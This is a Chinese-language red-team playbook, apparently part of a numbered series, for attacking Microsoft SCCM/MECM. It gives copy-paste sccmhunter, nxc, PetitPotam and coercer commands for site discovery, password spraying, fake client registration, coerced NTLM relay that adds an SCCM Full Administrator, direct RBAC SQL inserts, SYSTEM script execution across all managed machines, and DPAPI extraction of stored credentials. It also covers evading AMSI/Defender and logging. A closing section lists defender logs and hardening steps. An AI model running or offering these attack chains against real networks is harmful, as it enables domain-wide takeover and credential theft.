# SCCM 与 MECM 攻击面

SCCM(System Center Configuration Manager,新名 MECM/Microsoft Endpoint Configuration Manager,现 Intune 家族)是管理上万台 Windows 的"域内宙斯":装软件、发策略、跑脚本、采集硬件清单,全部以 **SYSTEM** 权限落在每台客户端上。这决定了它的红线属性——**拿到 SCCM 管理员 ≈ 拿到全网所有受管机器的 SYSTEM**,站点服务器本身还常握着推送账户/NAA/任务序列等一兜子域凭据,微软自 2022 起已把 SCCM 站点服务器划入 Tier-0。本文流程:发现定位(LDAP 指纹)→ SMB 画像与凭据雪球(NAA/PUSH 账户)→ 客户端注册滥用(http)→ 中继打点(relay/mssql,与 10 号 §1.5 中继矩阵同一套触发源)→ 拿下站点后 admin 控制台全网 SYSTEM + dpapi 离线解密 → OPSEC。命令均可直接复制,占位符用尖括号标注(如 `<站点服务器IP>` `<域名>`);bash 块 = 攻击机 Kali。

本文件工具:执行台 `sccmhunter` wrapper(~/tools/bin/sccmhunter → 源码 ~/tools/src/sccmhunter,v2.0.0,全部参数 `-h` 实测;数据目录 `~/.sccmhunter/logs/`,子目录 loot/csvs/json/db)、nxc 1.5.1(ldap 模块 `-M sccm`、smb 模块 `-M sccm-recon6` 实测存在)。配套:nxc/哈希/Kerberos 见 05、12;中继触发源(coercer/PetitPotam/responder)见 10 号;目标机侧 mimikatz、DPAPI 域备份密钥见 13 号;站点数据库(MSSQL)横向见 14 号。

---

## SCCM 体系与攻击面总览 — 四类器官、为什么 SCCM 管理员≈域管

来源:SCCM 架构常识(微软官方文档体系)+ sccmhunter 源码核实(攻击面与工具子命令一一对应)

```text
# ===== 站点体系(层级)=====
# CAS(中心管理站点,大企业才有)→ 主站点(Primary Site)→ 辅助站点(Secondary,基本淘汰)
# 一个"站点"= 一台站点服务器 + 一堆站点系统角色,靠 3 位站点代码(Site Code,如 PRI)标识

# ===== 四类器官(攻击者视角)=====
# 1. 站点服务器(Site Server)——大脑。持 SMS Provider(WMI/REST 管理接口)、通常同机/邻机放
#    站点数据库(MSSQL,CM_<站点代码> 库,RBAC 表就在里面)。打穿它=拿下整个站点。
#    AD 里对 CN=System Management 容器有完全控制的对象就是它(find/-M sccm 的定位原理)。
# 2. 管理点(Management Point,MP)——客户端的"柜台"。客户端注册、策略请求、清单上报全走它的
#    HTTP 端点:/ccm_system_windowsauth/request(NTLM)、/ccm_system/request(HTTP 匿名客户端通信)、
#    /ccm_system_altauth/request(PKI 证书)。伪装客户端注册滥用 = 打这里(sccmhunter http)。
#    管理接口 REST 版 = https://<站点服务器>/AdminService/wmi/(sccmhunter admin 打这里)。
# 3. 分发点(Distribution Point,DP)——内容仓库。SMB 共享 + IIS;开 PXE 的 DP 还管系统部署,
#    其"变量文件"里常藏 NAA/机器账户凭据(sccmhunter smb -save 拖的就是这个)。
# 4. 客户端 Agent(CCM)——每台受管机器上的 CcmExec 服务 + root\ccm 命名空间。它是"留在外围
#    器官里的免疫细胞":本地缓存 NAA 密文(DPAPI 加密,但 SYSTEM+本地管理员工具可解)、执行
#    任务序列/策略/脚本。打任意一台客户端 → dpapi 子命令离线掏 NAA(第 6 节)。

# ===== 为什么 SCCM 管理员 ≈ 域管 =====
# Full Administrator 的合法功能就是"在所有客户端以 SYSTEM 执行":
#   - CMPivot 查询(admin 控制台 20+ 条,ps/services/sessions...)= 全网无落地侦察
#   - 脚本部署(Scripts)/应用部署(application)= 全网 SYSTEM 代码执行,蓝队自己的"合法 C2"
#   - RBAC 表直插(relay/mssql 两条路)= 绕过控制台给自己发管理员
# 站点服务器机器账户通常对 System Management 容器完全控制(可扶持新站点服务器再夺权),
# 站点数据库里躺着全部机密封装。所以 SCCM 管理员凭据的价值 = 域管级,蓝军必须按 Tier-0 看待。
```

参数速查:
- 器官→打法映射:站点服务器 → `relay`/`mssql`/`admin`;MP → `http`;DP → `smb -save`;客户端 → `dpapi`
- 三个关键端点:`/ccm_system*/request`(注册/策略)、`/AdminService/wmi/`(管理 REST,443)、站点 DB `CM_<站点代码>`(见 14 号)
- 站点代码(Site Code)是全链路索引:LDAP 枚举、DB 名、relay `-sc` 参数都要用它

注意: SCCM 环境差异极大——架构扩展没做/AD 发布关闭时 LDAP 全空,HTTP 客户端通信关闭时匿名注册打不动,PXE 未启用时 DP 没有变量文件;先按第 2 节把"环境形态"摸清再选打法,别硬套。以下每节命令都以"上一节产物"为输入(find → smb/show → http/relay → admin/dpapi)。

---

## 发现与定位 — sccmhunter find 一把梭 + nxc 模块 + 手工 LDAP(过滤器全部源码核实)

来源:执行台 `sccmhunter`(v2.0.0,`find -h` 实测);nxc 1.5.1(`ldap -L`/`smb -L` 实测含 sccm、sccm-recon6 两个模块,模块源码 /usr/lib/python3/dist-packages/nxc/modules/ 核实);LDAP 过滤器逐条抄自 sccmhunter find 源码(lib/attacks/find.py),非虚构

```bash
# ===== 执行台:sccmhunter find(任何域用户即可,LDAP 只读)=====
sccmhunter find -u <域用户> -p '<密码>' -d <域名> -dc-ip <域控IP>
# 加 -resolve:把搜到的 SCCM 相关组做嵌套解析(memberOf 1.2.840.113556.1.4.1941 递归),
#   组里的用户/机器全展开——凭据雪球第一步(第 3 节);大环境慢,酌情
sccmhunter find -u <域用户> -p '<密码>' -d <域名> -dc-ip <域控IP> -resolve
# 哈希/Kerberos/LDAPS 变体(参数与 nxc 同风格,-hashes 格式 LM:NT)
sccmhunter find -u <域用户> -hashes :<NTLM哈希> -d <域名> -dc-ip <域控IP>
sccmhunter find -u <域用户> -k -no-pass -d <域名> -dc-ip <域控FQDN> -ldaps
# -all:域内每台机器全profile一遍找站点系统角色(WARNING: HEAVY,枚举风暴,大域别用)
# 结果落盘 ~/.sccmhunter/logs/db/find.db(sqlite),后续 show/smb/http 直接复用

# ===== 结果回看(任意时刻)=====
sccmhunter show -all          # 站点服务器/站点库/MP/PXE DP/计算机/用户/组 七张表
sccmhunter show -siteservers  # 单看站点服务器(SiteCode/签名状态/角色标记)
sccmhunter show -users        # SCCM 相关用户(NAA/PUSH 账户候选,第 3 节)
sccmhunter show -csv          # 附带导出 CSV(logs/csvs/);-json 同理

# ===== nxc 路线(已有一套 nxc 工作流时顺手)=====
nxc ldap <域控IP> -u <域用户> -p '<密码>' -M sccm                  # LDAP 全套枚举(等价 find 主干)
nxc ldap <域控IP> -u <域用户> -p '<密码>' -M sccm -o REC_RESOLVE=true   # 模块选项:递归解析组成员
nxc smb <目标IP> -u <域用户> -p '<密码>' -M sccm-recon6              # 打单机:winreg 查 SOFTWARE\Microsoft\SMS
# sccm-recon6 输出:是否主站点服务器/DP、站点数据库位置、匿名 DP 访问是否开、
#   站点服务器 SMB 签名状态(签名未强制 → TAKEOVER-2 路线,接第 5 节)
```

find 在 LDAP 里实际做的事(源码核实,手工复现同款过滤器——ldapsearch/SharpView/任意 LDAP 客户端均可):

```text
# ① 定位容器:CN=System Management,CN=System,<域DN>(AD 架构扩展+发布开启才存在)
#    过滤器:(distinguishedName=CN=System Management,CN=System,DC=x,DC=y)
#    读 nTSecurityDescriptor(sdflags=0x07)解析 DACL:有"完全控制"ACE 的 SID → 站点服务器
# ② 站点与 MP(架构类,扩展后必有):
#    (objectclass=mssmssite)                → 属性 msSMSSiteCode(拿站点代码;无 MP 的= CAS)
#    (objectclass=mssmsmanagementpoint)     → 属性 dNSHostname + msSMSSitecode(MP 清单)
# ③ PXE 分发点(WDS 发布的 connectionPoint):
#    (&(objectclass=connectionPoint)(netbootserver=*))  → 从 DN 截出宿主机
# ④ 字符串大捞(命名没规律的兜底):
#    (|(samaccountname=*sccm*)(samaccountname=*mecm*)(description=*sccm*)(description=*mecm*)
#      (name=*sccm*)(name=*mecm*))           → 用户/机器/组按 sAMAccountType 分类入库
# 以上都空(架构未扩展/发布关闭/DNS-only 模式)→ 思路(未实测):
#    a. 站点数据库主机的 MSSQLSvc SPN 指纹(见 14 号 MSSQL 发现)交叉定位;
#    b. 端口特征:MP 的 /ccm_system* 端点、AdminService 443、SUP 的 8530/8531、PXE 的 66/67/69;
#    c. 直接 sccmhunter find -all 全机器画像硬扫。
```

参数速查(find):
- `-u/-p/-d/-dc-ip` 基本四件套(`-d`、`-dc-ip` 必填);`-hashes LM:NT`、`-k -no-pass -aes` Kerberos/哈希
- `-resolve` 递归解析组(雪球必备);`-ldaps` 加密通道;`-binding/-signing` LDAP 通道加固场景
- `-t <目标域>` 跨信任域枚举;`-all` 全机器 profile(重);`-debug` 详细输出

参数速查(show):
- 七张表:`-siteservers`/`-dbs`/`-mps`/`-users`/`-computers`/`-groups`/`-creds`,或 `-all`;`-csv`/`-json` 导出
- 数据源固定 `~/.sccmhunter/logs/db/find.db`;find 每次运行会**重建**该库(旧结果不保留,先导出再重跑)

注意: `-M sccm` 与 find 同源(nxc 模块注释自认过滤器抄自 sccmhunter),二者选一即可,别重复跑放大日志;`-resolve` 在嵌套组深的大域会产生大量 LDAP 查询,DC 上看得见;`-all` 是枚举风暴级操作,只适合小域或授权压测;`System Management` 容器查询走 DC 安全日志(5143 类目录访问视审核策略而定),低权用户大批量拉 nTSecurityDescriptor 本身就是异常信号。

---

## SMB 画像与凭据雪球 — sccmhunter smb、NAA 账户 nxc 验证、PUSH 账户落地

来源:执行台 `sccmhunter`(`smb`/`show` 子命令 `-h` 实测;smb 源码核实:连 SMB 查签名/共享、远程注册表定位站点库、PXE 变量文件爬取);nxc 凭据验证参数见 05/10 号

```bash
# ===== sccmhunter smb:对 find 建出的资产做 SMB 侧画像 =====
sccmhunter smb -u <域用户> -p '<密码>' -d <域名> -dc-ip <域控IP>
# 每台已知站点系统角色机器:签到 → 查 SMB 签名状态 → 枚举共享 → 远程注册表找站点数据库
#   → PXE 机器爬"变量文件"(含 NAA 密文/有时有 DP 机器账户凭据)
sccmhunter smb -u <域用户> -p '<密码>' -d <域名> -dc-ip <域控IP> -save   # PXE 变量文件存盘(loot/)
sccmhunter smb -u <域用户> -hashes :<NTLM哈希> -d <域名> -dc-ip <域控IP>  # 哈希驱动

# ===== 凭据雪球:find -resolve 展开的用户清单 → nxc 逐个验活 =====
# SCCM 相关账户三大类(命名规律来自 check_strings 大捞结果):
#   NAA(Network Access Account):客户端 DPAPI 缓存的"内容访问账户",常是域用户、密码永不变
#   PUSH(客户端推送安装账户):站点服务器用来装客户端,权限=目标机本地管理员,常批量复用
#   任务序列运行账户/集合变量:部署时 SYSTEM 之外的第二套域凭据
# 第 1 步:拿到候选清单(find -resolve / show -users / show -creds)
sccmhunter show -users
# 第 2 步:nxc 全网验活(撞库姿势同 05 号,--ufail-limit 防锁号是底线)
nxc smb <网段CIDR> -u <NAA候选清单文件> -p '<密码或字典>' --ufail-limit 3 --continue-on-success
nxc smb <网段CIDR> -u <用户> -H <NTLM哈希> --local-auth   # PUSH 账户常是"本地管理员"而非域管
# 第 3 步:验活成功的 PUSH 账户 → 直接当跳板账户横向(wmiexec/WinRM 见 05/13);
#   拿到站点服务器本地管理员 → 第 5 节 relay 不需要了,直接去第 6 节 admin/dpapi
```

参数速查(smb):
- 认证参数同 find(`-u/-p/-d/-dc-ip` 必填风格一致,`-hashes/-k/-aes/-no-pass` 全支持)
- `-save` 保存发现的 PXE 变量文件到 `~/.sccmhunter/logs/loot/`;`-ldaps`、`-debug` 同上

注意: smb 子命令吃的是 find 的库——**先 find 再 smb**,单独跑 smb 会因 db 里没有目标而空转;PXE 变量文件是"部署基础设施的钥匙"(能伪造装机流程),敏感度极高,作业时只取凭据字段,别动部署配置;NAA 的价值在于"客户端人人可解"(SYSTEM 下 DPAPI),所以第 6 节 dpapi 打任意客户端也能拿到同一批 NAA——两条路殊途同归;PUSH 账户若密码复用到多台站点服务器,一次雪球全线开花,这是 SCCM 最经典的失分点。

---

## 客户端注册滥用 — sccmhunter http:伪装客户端注册、策略索取与 SCCM Push 打法

来源:执行台 `sccmhunter http`(`-h` 实测,完整参数);注册/策略流程源码核实(lib/scripts/sccmwtf.py):自造 RSA 密钥+客户端证书伪装 clientauth,`CCM_POST` 打 MP 端点,收 `PolicyCategory="NAAConfig"` 策略并解密落盘

```bash
# ===== 场景 A:手上只有普通域用户(或 MachineAccountQuota 默认)=====
# -auto:LDAP 建 Machine Account → 注册成 SCCM 客户端 → 等库同步 → 索取策略
#   策略里的 NAAConfig 解密后落盘 ~/.sccmhunter/logs/loot/naapolicy.xml
sccmhunter http -u <域用户> -p '<密码>' -d <域名> -dc-ip <域控IP> -auto
# 没跑过 find 时手工指定 MP(-mp);跑过则自动从 find.db 挑 MP
sccmhunter http -u <域用户> -p '<密码>' -d <域名> -dc-ip <域控IP> -mp <MP的IP或FQDN> -auto

# ===== 场景 B:已控制一台真客户端的机器账户 =====
# 用它的 NTLM 哈希注册(-ch 仅可用于 push 场景,-cn/-ch 成对),身份更"正"
sccmhunter http -mp <MP的IP> -cn '<已控机器名>$' -ch <该机器NTLM哈希> -d <域名> -dc-ip <域控IP>

# ===== 场景 C:注册后二次取策略(把上一轮的注册材料复用)=====
# 首轮注册会把 <UUID>.data / <UUID>.pem 存进 logs 目录;-uuid + -mp 手工补一次策略请求
sccmhunter http -uuid <上一轮输出的UUID> -mp <MP的IP> -d <域名> -dc-ip <域控IP>
# PKI 客户端环境:--altauth 走 /ccm_system_altauth/request(需能持证书)

# ===== SCCM Push 打法(TAKEOVER 思路:骗站点服务器"推装"到你控制的机器)=====
# 原理:伪装一台"没装客户端"的机器注册 → 触发站点服务器 client push →
#   PUSH 账户带着凭据撞进 <spcn> 指定的监听机(配 responder/ntlmrelayx 抓或中继)
# 变体 1:已有域用户凭据(自动建机器账户再推)
sccmhunter http -u <域用户> -p '<密码>' -d <域名> -dc-ip <域控IP> -sleep 10 -sp -spcn <中继监听机IP>
# 变体 2:已控机器账户直接推
sccmhunter http -mp <MP的IP> -cn '<已控机器名>$' -ch <机器NTLM哈希> -sleep 10 -sp -spcn <中继监听机IP> -dc-ip <域控IP> -d <域名>
# 变体 3:匿名注册触发(服务器开 HTTP 匿名客户端通信时;源码注释:实测中意外地常有效)
sccmhunter http -mp <MP的IP> -sleep 10 -sp -spcn <中继监听机IP> -dc-ip <域控IP> -d <域名> \
  -sppid 'Microsoft Windows NT Server 10.0' --sccm-push-anonymous
# 监听侧(spn 指向本机时):responder 抓哈希或 ntlmrelayx 中继,见 10 号 §1.5
```

参数速查(http):
- 认证:`-u/-p/-d/-dc-ip`(域用户)、`-k/-no-pass/-hashes/-aes`(Kerberos/哈希)
- 伪装身份:`-cn <机器名>`/`-cp <机器密码>`/`-ch <机器NTLM哈希>`(ch 仅 push 场景);`-uuid` 复用注册
- 目标:`-mp <MP>` 手工指定;`-sleep <秒>`(默认 10)注册后等库同步;`--altauth` PKI altauth 端点
- push 家族:`-sp` 开关、`-spcn <监听机>`(必配)、`-spanon` 匿名、`-sppid <平台ID>`(默认 `Microsoft Windows NT Workstation 2010.0`,改 Server 常提高成功率)
- 产物:`logs/loot/naapolicy.xml`(解密后的 NAA 策略)、`logs/<UUID>.data/.pem`(注册材料,复用取策略)

注意: 注册滥用对"客户端审批"策略敏感——要求审批的环境里匿名注册只能拿到 unapproved 客户端身份,但源码实测注释确认 push 触发仍常有效;`-sleep` 别调太小,站点库没同步完策略请求会空手;MP 端走 HTTP(明文)时整个注册流量可被蓝队 IDS 还原,`PolicyCategory="NAAConfig"` 的 GET 是明确攻击特征;**老版本滥用思路(未实测,仅方向)**:旧版 MP 对注册报文头解析宽松,存在 CRLF 注入篡改策略路由的报告;配置基线(Configuration Baseline)与任务序列若被低权用户可编辑,等于现成的"策略下发执行"原语——见到再深挖,勿照本宣科。第 5 节 relay 不需要任何域凭据,与本节互补。

---

## 中继打点 — sccmhunter relay(TAKEOVER-5:打 AdminService)与 mssql(直插 RBAC)

来源:执行台 `sccmhunter relay`/`mssql`(`-h` 实测);relay 源码核实:内置 impacket SMBRelayServer 监听,把到来的 NTLM 中继到 `https://<目标>/AdminService/wmi/SMS_Admin` POST 新建 SMS_Admin(SMS0001R 全角色);mssql 源码核实:LDAP 解析目标用户 SID(转 0x 十六进制)与域 NetBIOS 名后**打印**插入 `CM_<站点代码>` 库 RBAC_Admins/RBAC_ExtendedPermissions 的 SQL

```bash
# ===== relay:TAKEOVER-5,零域凭据入场 =====
# 前提:能把站点服务器(SMS Provider 宿主)的机器账户/服务账户"喂"到本机 SMB——
#   触发源全部复用 10 号 §1.5:coercer coerce / PetitPotam / 打印机 bug / ADIDNS+UNC
# 先拿目标用户 SID(域内任意已控低权用户;SID 见 05 号 whoami / BloodHound)
# 起监听:445 收认证 → 中继到目标 AdminService → 目标用户被加成 SCCM 管理员
sudo sccmhunter relay -t <站点服务器IP或FQDN> -tu <域名>\<要提权的用户> -ts <该用户SID>
# 自定义监听面/端口(默认 0.0.0.0:445;to 默认超时 5)
sudo sccmhunter relay -t <站点服务器IP> -tu <域名>\<用户> -ts S-1-5-21-... -i <本机网卡IP> -p 445 -v
# 成功特征:HTTP 201,"Target user ... added as an SCCM admin" → 提权用户直接去第 6 节 admin
# 触发(另一终端,同 10 号):
sudo python3 ~/tools/src/PetitPotam/petitpotam.py <本机IP> <站点服务器IP>
sudo coercer coerce -t <站点服务器IP> -l <本机IP> -m ms-dfsnm

# ===== mssql:能打站点数据库时的"直接插管理员" =====
# 适用:拿到了站点 DB 的 MSSQL 登录(站点服务器本地管理员/DBA/sa,衔接 14 号),
#   或 ntlmrelayx 中继进 MSSQL 时要一条现成的堆叠注入
sccmhunter mssql -u <域用户> -p '<密码>' -d <域名> -dc-ip <域控IP> -tu <要提权的用户> -sc <站点代码>
# 输出两段 SQL(已含 hex SID 与 NetBIOS 名):拿去 14 号的 mssqlclient 里执行,或
#   -stacked 让工具拼成单条堆叠查询配合中继器使用
sccmhunter mssql -u <域用户> -p '<密码>' -d <域名> -dc-ip <域控IP> -tu <用户> -sc PRI -stacked
# SQL 本体(源码核实):INSERT RBAC_Admins + RBAC_ExtendedPermissions 三行
#   (SMS0001R=Full Administrator 角色;SMS00ALL/29 全范围、SMS00001/1、SMS00004/1)

# ===== 与 10 号中继矩阵的衔接 =====
# 10 号 §1.5 是通用矩阵(LDAPS/LDAP/CA/SMB);SCCM 只是新增两个"目标列":
#   | AdminService(站点服务器 443) | sccmhunter relay -t ... -tu ... -ts ... | 一次认证=SCCM 管理员 |
#   | 站点 DB(MSSQL,签名不设限) | ntlmrelayx + sccmhunter mssql -stacked 生成语料 | 一次登录=RBAC 直插 |
# 触发源、--gen-relay-list、responder 冲突规避等操作纪律全部照 10 号执行,不重复展开
```

参数速查(relay):
- `-t <SMS Provider目标>`(站点服务器)、`-tu <域\用户>`、`-ts <用户SID>` 三件套必配
- `-i <网卡>`(默认 0.0.0.0)、`-p <端口>`(默认 445)、`-to <秒>`(默认 5)、`-v` 详细输出
- 无凭据要求——吃的是"被诱骗来的认证";一次成功即退出

参数速查(mssql):
- `-tu <用户>`(必填,提权对象)、`-sc <站点代码>`(必填,如 PRI);认证参数同 find
- `-stacked` 输出单条堆叠查询(给中继器/注入点用);产物是 SQL 文本,不自动执行

注意: relay 打 AdminService 的前提是该 HTTPS 端点不做 EPA/通道绑定且来者身份本身有权建 SMS_Admin(站点服务器机器账户天然满足,所以诱骗对象就选它);relayed POST 的响应 201 与 401 含义不同——401 只是"来者无权",别当失败重试刷日志;SQL 直插 RBAC 属于"绕过一切控制台审计"的写法,站点 DB 的事务日志里 INSERT 痕迹仍在(DBA 侧可见);整个第 5 节与 10 号共用 OPSEC 纪律:coercer 扫描先于强制、深夜集中触发=典型攻击特征。

---

## 机器控制 — sccmhunter admin(AdminService 控制台:全网 SYSTEM)与 dpapi(客户端机密离线解)

来源:执行台 `sccmhunter admin`/`dpapi`(`-h` 实测);admin 源码核实:连 `https://<ip>/AdminService/wmi/` 后进 cmd2 交互壳,内置 SA/DB/PE/CE/OPSEC 五类命令(CMPivot 系列调 lib/scripts/pivot.py);dpapi 源码核实:WMI 走 `root\ccm\Policy\Machine\ActualConfig` 查 `CCM_NetworkAccessAccount`/`CCM_TaskSequence`/`CCM_CollectionVariable`,disk 路线拖 `Windows\System32\wbem\Repository\OBJECTS.DATA` 正则抠 PolicySecret 后 DPAPI 解密

```bash
# ===== admin:SCCM 管理员/站点服务器本地管理员在手时 =====
sccmhunter admin -u <SCCM管理员> -p '<密码>' -ip <站点服务器IP>            # NTLM(密码)
sccmhunter admin -u <SCCM管理员> -p 'LM:NT哈希' -ip <站点服务器IP>          # 哈希(-p 直接吃 LM:NT)
sccmhunter admin -u <SCCM管理员> -p '<密码>' -ip <站点服务器IP> -k -d <域名> -dc <域控FQDN>  # Kerberos
# 进入交互壳(提示符 "(设备) (路径) >>"),先挑目标设备:
interact <设备名或资源ID>          # get_device 可查;此后所有命令对这台生效

# --- 态势感知(SA,CMPivot 原生查询,不落地目标盘)---
ls / c:\\                          # 列目录(先 cd c:\\ 切工作目录再 ls 也行)
cat <文件名>                       # 读文件(经 CMPivot 文件读取,免 445)
ps                                 # 进程清单;  services 运行服务;  shares 共享列表
sessions                           # 在线用户;  console_users 历史控制台登录(找真人)
software                           # 已装软件;  osinfo / environment / disk / list_disk / ipconfig
administrators                     # 本地管理员组成员
sessionhunter -user <域用户>       # 全网找该用户当前会话在哪台机器

# --- 数据库查询(DB,站点库只读侦察)---
get_device <名称>                  # 单设备详情(拿 ResourceID)
get_user <域用户> / get_puser <域用户>   # 用户对象 / 其主用设备
get_lastlogon <域用户>             # 最近登录的设备
get_collection * / get_collectionmembers <集合ID>   # 集合与成员(=目标分组)

# --- 执行与提权(PE)---
script /path/to.ps1                # 部署 PowerShell 脚本到 interact 的设备(走 Scripts API)
application -path <应用路径> -name <名称> -target <资源ID>   # 应用部署执行
add_admin <域\用户> <SID>           # 直接加 SCCM 管理员;delete_admin / show_admins / show_rbac 配套
show_consoleconnections            # 谁在用 SCCM 控制台、从哪台机器
get_sccmversion / get_consoleinstaller   # 版本 / 拉控制台安装包

# --- 凭据提取(CE,站点侧机密封)---
get_creds                          # 站点服务器全部加密凭据 blob(NAA/PUSH 等)
get_pxepassword                    # PXE 启动密码 blob
get_forestkey / get_azurecreds / get_azuretenant   # 林发现密钥 / Azure 应用凭据 / 租户信息
decrypt <blob>                     # 站点服务器 DeviceID 在 interact 状态下可解 blob
speak_to_the_manager               # 直接倾泻策略凭据(一键全解)

# ===== dpapi:任意一台 SCCM 客户端的本地管理员即可(拿 NAA 最稳的路)=====
# -wmi:查 root\ccm\Policy\Machine\ActualConfig 三类机密(默认)
sccmhunter dpapi -u <本地管理员> -p '<密码>' -d <域名> -dc-ip <域控IP> -target <客户端机器名> -wmi
# WMI 查不到(对象被改/删)→ -disk 拖 OBJECTS.DATA 离线抠;-both 双管齐下
sccmhunter dpapi -u <本地管理员> -p '<密码>' -d <域名> -dc-ip <域控IP> -target <客户端机器名> -disk
sccmhunter dpapi -u <本地管理员> -hashes :<NTLM哈希> -d <域名> -dc-ip <域控IP> -target <客户端机器名> -both
# 解密链(源码核实):DPAPI blob → 机器 masterkey → 本地 LSA 密钥解密(自动,等价 13 号 mimikatz
#   dpapi::shield 思路);产物:NAA 账密 / 任务序列 TS_Sequence / 集合变量键值
```

参数速查(admin):
- `-u/-p`(密码或 `LM:NT` 哈希)、`-ip <站点服务器>`(必填)、`-k -d -dc` Kerberos 三件套
- `-au/-ap` 脚本审批人账密(脚本部署需两次审批时,给个有权批的低权账户)、`-ac <ccache>` 其 Kerberos
- `-pstransiform 风格外置混淆`:`-pstransform '<命令> {input} {output}'` 让脚本下发前先过你的混淆器
- 交互内 `help` 看全量;`set_scriptauthor/set_scriptname` 改脚本元数据(OPSEC)

参数速查(dpapi):
- `-target <机器名>`(必填)、`-u`(必填,目标机本地管理员)、`-p/-hashes/-aesKey/-k` 凭据四选一
- `-wmi`(默认)/`-disk`(OBJECTS.DATA 离线)/`-both`;`-impacket-debug` 调试 impacket 层

注意: admin 控制台每一个动作都是站点侧的"合法管理操作"——蓝队日志齐全(见第 7 节),但这恰是双刃剑:红队要控制节奏,把 SA 查询合并做、PE 执行点到为止;`script` 会把 PowerShell 落到目标 SMS 代理执行,AMSI/Defender 照常生效(配 `-pstransform` 或用 13 号免杀思路);dpapi 走 WMI/DCOM,比拖 lsass 温和(无 4688 AMSI 告警面),但会在客户端 `CCM` 日志留查询痕迹;`-disk` 会临时拷贝 OBJECTS.DATA 到 `C:\Windows\Temp` 再自删,EDR 对 wbem\Repository 的读取可能挂钩——优先 `-wmi`。站内拿到的 NAA 凭据回到第 3 节 nxc 验活闭环。

---

## OPSEC 与防御视角 — SCCM 日志面、审计思路、加固清单

来源:日志路径为 SCCM 官方文档通用约定(标"通用");审计思路为方向性建议(未逐条实测事件 ID,勿照抄数字)

```text
# ===== 攻击侧 OPSEC(红队对照,按节回看)=====
# - find/-M sccm:低权大批量 LDAP 拉安全描述符是可见模式;能复用 BloodHound 采集流量就别单独再跑
# - http 注册:MP 的 CcmMessaging/策略日志完整记录伪客户端(NetBIOS 名/UUID/来源 IP 全落盘),
#   伪装机器名起得像测试机(如 IT-TEST-01),别用随机串
# - relay/mssql:触发纪律全同 10 号 §1.5(coercer 先探后打、错峰);RBAC 直插在 DB 事务日志留痕
# - admin:SMSProv/AdminService 日志记全每个查询与脚本;"合法功能滥用"的价值在于像管理员,
#   半夜对全集合跑 ps = 自报家门;脚本用完 delete_script 清单
# - dpapi:-disk 的 OBJECTS.DATA 拷贝是 EDR 高敏动作,优先 -wmi

# ===== 防御侧日志面(蓝队,路径为官方通用约定)=====
# 客户端:   C:\Windows\CCM\Logs\
#   CcmMessaging.log(注册/策略通信——第 4 节主痕迹)、PolicyAgent.log(策略请求)、
#   LocationServices.log / ClientLocation.log(MP 定位)、Scripts.log(脚本执行,第 6 节)
# 站点服务器:C:\Program Files\Microsoft Configuration Manager\Logs\
#   ccm.log(客户端推送安装——Push 打法痕迹)、SMSProv.log(SMS Provider 全部 WMI/管理操作,
#   relay/admin 都在这留名)、AdminService.log(REST 层)、sitectrl.log(站点控制文件变更=
#   RBAC/站点级改动落盘)、bgbserver.log(CMPivot 通道)
# 思路(方向,事件 ID 待核):SMS_Admin 新增(无论控制台/relay/SQL 直插最终都会反映到
#   站点控制文件与状态消息)、非常规来源的 SCCM 控制台/API 连接(show_consoleconnections 的
#   防御用法)、新注册客户端的命名与所属 OU 突增、PXE 变量文件被非部署账户读取。

# ===== 加固清单(报告可直接引用)=====
# 1. 客户端推送安装:禁用或收严 fallback NTLM、推送账户每台唯一且非域权限、目标过滤到 OU
# 2. 客户端通信改 HTTPS-only(关 /ccm_system 匿名注册面),MP 启用证书 PKI
# 3. 弃用 NAA(改 DP 域机器账户访问内容);必须用时限权、定期换、不进本地缓存策略
# 4. PXE:启用启动密码、清除变量文件中的敏感值、DP 匿名访问关闭
# 5. 站点服务器按 Tier-0 对待:专属账户、与域管隔离、SMB 签名强制、AdminService 限源+EPA
# 6. RBAC 最小化,审 Full Administrator 名单(show_rbac 的防御用法),开站点级状态消息审计
```

注意: 本文"思路/通用/未实测"标注处不要当成已验证事实引用——尤其事件 ID 与旧版 CRLF 类利用,落地前先在实验环境复现;SCCM 版本差异(current branch 各版本)会开关部分攻击面,拿 `get_sccmversion` 的输出对号入座;与其它文档的分工:中继触发与通用 OPSEC 看 10 号,目标机侧工具与免杀看 13 号,站点数据库深挖看 14 号,Kerberos 化所有认证(-k)看 12 号。
